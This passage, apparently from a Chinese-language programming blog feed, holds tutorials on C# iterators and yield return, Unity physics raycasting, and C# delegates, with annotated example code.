class="keyword">new</span> <span class="keyword">int</span>[] &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span> &#125;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="meta">#<span class="meta-keyword">region</span> IEnumerable</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="function"><span class="keyword">public</span> IEnumerator <span class="title">GetEnumerator</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        Reset();</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="meta">#<span class="meta-keyword">endregion</span></span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">public</span> <span class="keyword">object</span> Current</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">get</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">return</span> list[position];</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">bool</span> <span class="title">MoveNext</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//移动光标</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        ++position;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//是否溢出 溢出就不合法</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">return</span> position &lt; list.Length;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//reset是重置光标位置 一般写在获取 IEnumerator对象这个函数中</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//用于第一次重置光标位置</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Reset</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        position = <span class="number">-1</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<h3 id="3-用yield-return-语法糖实现迭代器"><a href="#3-用yield-return-语法糖实现迭代器" class="headerlink" title="3.用yield return 语法糖实现迭代器"></a>3.用yield return 语法糖实现迭代器</h3><p>yield return 是C#提供给我们的语法糖<br>所谓语法糖，也称糖衣语法<br>主要作用就是将复杂逻辑简单化，可以增加程序的可读性<br>从而减少程序代码出错的机会</p>
<p>关键接口：IEnumerable<br>命名空间：using System.Collections;<br>让想要通过foreach遍历的自定义类实现接口中的方法GetEnumerator即可</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">CustomList2</span> : <span class="title">IEnumerable</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] list;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CustomList2</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        list = <span class="keyword">new</span> <span class="keyword">int</span>[] &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span> &#125;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> IEnumerator <span class="title">GetEnumerator</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; list.Length; i++)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="comment">//yield关键字 配合迭代器使用</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="comment">//可以理解为 暂时返回 保留当前的状态</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="comment">//一会还会在回来</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="comment">//C#的语法糖</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">yield</span> <span class="keyword">return</span> list[i];</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//yield return list[0];</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//yield return list[1];</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//yield return list[2];</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//yield return list[3];</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//yield return list[4];</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//yield return list[5];</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//yield return list[6];</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//yield return list[7];</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr></table></figure>

<h3 id="4-用yield-return-语法糖为泛型类实现迭代器"><a href="#4-用yield-return-语法糖为泛型类实现迭代器" class="headerlink" title="4.用yield return 语法糖为泛型类实现迭代器"></a>4.用yield return 语法糖为泛型类实现迭代器</h3><p> //foreach本质 </p>
<p>1.先获取in后面这个对象的 IEnumerator<br>会调用对象其中的GetEnumerator方法 来获取<br>2.执行得到这个IEnumerator对象中的 MoveNext方法<br>3.只要MoveNext方法的返回值时true 就会去得到Current</p>
<p>  然后复制给 item</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">class CustomList&lt;T&gt; : IEnumerable</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">private</span> T[] array;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CustomList</span>(<span class="params"><span class="keyword">params</span> T[] array</span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">this</span>.array = array;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> IEnumerator <span class="title">GetEnumerator</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; array.Length; i++)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">yield</span> <span class="keyword">return</span> array[i];</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<h3 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h3><p>迭代器就是可以让我们在外部直接通过foreach遍历对象中元素而不需要了解其结构<br>主要的两种方式<br>1.传统方式 继承两个接口 实现里面的方法<br>2.用语法糖 yield return 去返回内容 只需要继承一个接口即可</p>
]]></content>
  </entry>
  <entry>
    <title>Unity射线检测</title>
    <url>/2021/05/16/Unity%E5%B0%84%E7%BA%BF%E6%A3%80%E6%B5%8B/</url>
    <content><![CDATA[<center>unity射线检测</center>

<a id="more"></a>

<h4 id="1-什么是射线检测？"><a href="#1-什么是射线检测？" class="headerlink" title="1.什么是射线检测？"></a>1.什么是射线检测？</h4><p>目前我们学习的物体相交判断<br>1.碰撞检测——必备条件 1刚体2碰撞器<br>2.范围检测——必备条件 碰撞器</p>
<p>如果想要做这样的碰撞检测呢？</p>
<p>1.鼠标选择场景上一物体<br>2.FPS射击游戏（无弹道-不产生实际的子弹对象进行移动）<br>等等 需要判断一条线和物体的碰撞情况</p>
<p>射线检测 就是来解决这些问题的<br>它可以在指定点发射一个指定方向的射线<br>判断该射线与哪些碰撞器相交，得到对应对象</p>
<h4 id="2-射线对象"><a href="#2-射线对象" class="headerlink" title="2.射线对象"></a>2.射线对象</h4><p>1.3D世界中的射线<br>假设有一条<br>起点为坐标(1,0,0)<br>方向为世界坐标Z轴正方向的射线<br>注意：<br>理解参数含义<br>参数一：起点<br>参数二：方向（一定记住 不是两点决定射线方向，第二个参数 直接就代表方向向量）</p>
<p>目前只是申明了一个射线对象 对于我们来说 没有任何的用处</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Ray r = <span class="keyword">new</span> Ray(Vector3.right, Vector3.forward);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//Ray中的参数</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">print(r.origin);<span class="comment">//起点</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">print(r.direction);<span class="comment">//方向</span></span></pre></td></tr></table></figure>

<p>2.摄像机发射出的射线<br>得到一条从屏幕位置作为起点<br>摄像机视口方向为 方向的射线</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Ray r2 = Camera.main.ScreenPointToRay(Input.mousePosition);</span></pre></td></tr></table></figure>

<p>注意：<br>单独的射线对于我们来说没有实际的意义<br>我们需要用它结合物理系统进行射线碰撞判断</p>
<h4 id="3-碰撞检测函数"><a href="#3-碰撞检测函数" class="headerlink" title="3.碰撞检测函数"></a>3.碰撞检测函数</h4><p>Physics类中提供了很多进行射线检测的静态函数<br>他们有很多种重载类型 我们只需要掌握核心的几个函数 其它函数自然就明白什么意思了<br>注意：<br>射线检测也是瞬时的<br>执行代码时进行一次射线检测</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.最原始的射线检测</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">// 准备一条射线</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">Ray r3 = <span class="keyword">new</span> Ray(Vector3.zero, Vector3.forward);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">// 进行射线检测 如果碰撞到对象 返回true</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//参数一：射线</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//参数二: 检测的最大距离 超出这个距离不检测</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//参数三：检测指定层级（不填检测所有层）</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//参数四：是否忽略触发器 UseGlobal-使用全局设置 Collide-检测触发器 Ignore-忽略触发器 不填使用UseGlobal</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//返回值：bool 当碰撞到对象时 返回 true 没有 返回false</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (Physics.Raycast(r3, <span class="number">1000</span>, <span class="number">1</span> &lt;&lt; LayerMask.NameToLayer(<span class="string">"Monster"</span>), QueryTriggerInteraction.UseGlobal))</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    print(<span class="string">"碰撞到了对象"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//还有一种重载 不用传入 射线 直接传入起点 和 方向 也可以用于判断</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//就是把 第一个参数射线 变成了 射线的 两个点 一个起点 一个方向</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (Physics.Raycast(Vector3.zero, Vector3.forward, <span class="number">1000</span>, <span class="number">1</span> &lt;&lt; LayerMask.NameToLayer(<span class="string">"Monster"</span>), QueryTriggerInteraction.UseGlobal))</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    print(<span class="string">"碰撞到了对象2"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//2.获取相交的单个物体信息</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//物体信息类 RaycastHit</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">RaycastHit hitInfo;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//参数一：射线</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//参数二：RaycastHit是结构体 是值类型 Unity会通过out 关键在 在函数内部处理后 得到碰撞数据后返回到该参数中</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//参数三：距离</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//参数四：检测指定层级（不填检测所有层）</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//参数五：是否忽略触发器 UseGlobal-使用全局设置 Collide-检测触发器 Ignore-忽略触发器 不填使用UseGlobal</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (Physics.Raycast(r3, <span class="keyword">out</span> hitInfo, <span class="number">1000</span>, <span class="number">1</span> &lt;&lt; LayerMask.NameToLayer(<span class="string">"Monster"</span>), QueryTriggerInteraction.UseGlobal))</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    print(<span class="string">"碰撞到了物体 得到了信息"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//碰撞器信息</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    print(<span class="string">"碰撞到物体的名字"</span> + hitInfo.collider.gameObject.name);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//碰撞到的点</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    print(hitInfo.point);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//法线信息</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    print(hitInfo.normal);</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//得到碰撞到对象的位置</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    print(hitInfo.transform.position);</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//得到碰撞到对象 离自己的距离</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    print(hitInfo.distance);</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//RaycastHit 该类 对于我们的意义</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//它不仅可以得到我们碰撞到的对象信息</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//还可以得到一些 碰撞的点 距离 法线等等的信息</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//还有一种重载 不用传入 射线 直接传入起点 和 方向 也可以用于判断</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (Physics.Raycast(Vector3.zero, Vector3.forward, <span class="keyword">out</span> hitInfo, <span class="number">1000</span>, <span class="number">1</span> &lt;&lt; LayerMask.NameToLayer(<span class="string">"Monster"</span>), QueryTriggerInteraction.UseGlobal))</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//3.获取相交的多个物体</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//可以得到碰撞到的多个对象</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//如果没有 就是容量为0的数组</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//参数一：射线</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//参数二：距离</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//参数三：检测指定层级（不填检测所有层）</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//参数四：是否忽略触发器 UseGlobal-使用全局设置 Collide-检测触发器 Ignore-忽略触发器 不填使用UseGlobal</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">RaycastHit[] hits = Physics.RaycastAll(r3, <span class="number">1000</span>, <span class="number">1</span> &lt;&lt; LayerMask.NameToLayer(<span class="string">"Monster"</span>), QueryTriggerInteraction.UseGlobal);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; hits.Length; i++)</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    print(<span class="string">"碰到的所有物体 名字分别是"</span> + hits[i].collider.gameObject.name);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//还有一种重载 不用传入 射线 直接传入起点 和 方向 也可以用于判断</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//之前的参数一射线 通过两个点传入</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">hits = Physics.RaycastAll(Vector3.zero, Vector3.forward, <span class="number">1000</span>, <span class="number">1</span> &lt;&lt; LayerMask.NameToLayer(<span class="string">"Monster"</span>), QueryTriggerInteraction.UseGlobal);</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//还有一种函数 返回的碰撞的数量 通过out得到数据</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (Physics.RaycastNonAlloc(r3, hits, <span class="number">1000</span>, <span class="number">1</span> &lt;&lt; LayerMask.NameToLayer(<span class="string">"Monster"</span>), QueryTriggerInteraction.UseGlobal) &gt; <span class="number">0</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>Csharp委托</title>
    <url>/2021/04/11/Csharp%E5%A7%94%E6%89%98/</url>
    <content><![CDATA[<center>最近在学习c#的进阶课记录一下</center>

<a id="more"></a>

<h3 id="1-委托是什么"><a href="#1-委托是什么" class="headerlink" title="1.委托是什么"></a>1.委托是什么</h3><p>委托是函数（方法）的容器，可以理解为表达函数（方法）的变量类型</p>
<p>用来存储、传递函数（方法）</p>
<p>委托的本质是一个类，用来定义函数（方法）的类型（返回值和参数的类型）</p>
<h3 id="2-基本语法"><a href="#2-基本语法" class="headerlink" title="2.基本语法"></a>2.基本语法</h3><p>关键字：delegate</p>
<p>语法：访问修饰符 delegate 返回值 委托名（参数列表）</p>
<p>一般声明在namespace中，当然在class语句块中也可以。</p>
<h3 id="3-定义自定义委托"><a href="#3-定义自定义委托" class="headerlink" title="3.定义自定义委托"></a>3.定义自定义委托</h3><p>访问修饰符默认不写为public 在别的命名空间也能使用</p>
<p>private则在其他命名空间就不能使用</p>
<p>一般使用public</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//申明了一个可以用来存储无参无返回值函数的容器</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//这里只是定义了规则 并没有使用</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">delegate</span> <span class="keyword">void</span> <span class="title">MyFun</span>(<span class="params"></span>)</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//会报错，因为委托是不能重名的（在同一语句块中）</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">delegate</span> <span class="keyword">int</span> <span class="title">MyFun</span>(<span class="params"><span class="keyword">int</span> a</span>)</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//表示用来装载或传递返回值类型为int，有一个int参数的函数的 委托 容器规则</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">delegate</span> <span class="keyword">int</span> <span class="title">MyFun2</span>(<span class="params"><span class="keyword">int</span> a</span>)</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//委托是支持泛型的，可以让返回值和参数可变</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">delegate</span> T MyFun3&lt;T, K&gt;(T v, K k)</span></pre></td></tr></table></figure>

<h3 id="4-定义好的委托"><a href="#4-定义好的委托" class="headerlink" title="4.定义好的委托"></a>4.定义好的委托</h3><p>委托变量是函数的容器</p>
<p>委托常用在：1.作为类的成员 2.作为函数的参数</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">Test</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//声明自定义的两个委托变量</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">public</span> MyFun fun;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> MyFun2 fun2;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//使用函数的方式传入委托变量</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">TestFun</span>(<span class="params">MyFun fun,MyFun2 fun2</span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//这样可以在里面先执行一些其他逻辑 在执行传入和函数</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">int</span> i = <span class="number">1</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        i *= <span class="number">2</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        i += <span class="number">2</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//直接调用这两个函数</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        fun();</span></pre></td></tr><tr><td class="code"><pre><span class="line">        fun2(i)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//也可以将这两个函数存储起来</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">this</span>.fun = fun;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">this</span>.fun2 =fun2;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<p>委托的执行</p>
<p>两种方式来调用：1.利用Invoke()函数来调用 2.直接调用</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Console.WriteLine(<span class="string">"委托"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="comment">//专门用来装载 函数的 容器</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	MyFun f = <span class="keyword">new</span> MyFun(Fun);</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Console.WriteLine(<span class="string">"1"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Console.WriteLine(<span class="string">"2"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Console.WriteLine(<span class="string">"3"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Console.WriteLine(<span class="string">"4"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Console.WriteLine(<span class="string">"5"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//第一种方式</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	f.Invoke();</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//第二种方式</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    f();</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Fun</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Console.WriteLine(<span class="string">"张三做什么"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>



<h3 id="5-委托变量可以存储多个函数-多播委托"><a href="#5-委托变量可以存储多个函数-多播委托" class="headerlink" title="5.委托变量可以存储多个函数(多播委托)"></a>5.委托变量可以存储多个函数(多播委托)</h3><p>委托的增加</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">AddFun</span>(<span class="params">MyFun fun, MyFun2 fun2</span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">this</span>.fun += fun;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">this</span>.fun2 += fun2;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<p>委托的删除</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">AddFun</span>(<span class="params">MyFun fun, MyFun2 fun2</span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">this</span>.fun -= fun;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">this</span>.fun2 -= fun2;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="comment">//直接清空容器</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">this</span>.fun = <span class="literal">null</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<h3 id="6-系统定义好的委托"><a href="#6-系统定义好的委托" class="headerlink" title="6.系统定义好的委托"></a>6.系统定义好的委托</h3><p>在c#中有很多已经帮我们定义好的委托来直接调用</p>
<p>需要引入using Systeme</p>
<p>1.无参无返回值 Action</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Action action = Fun;</span></pre></td></tr></table></figure>

<p>2.可以指定返回值类型的 泛型委托 Func<out tresult></out></p>
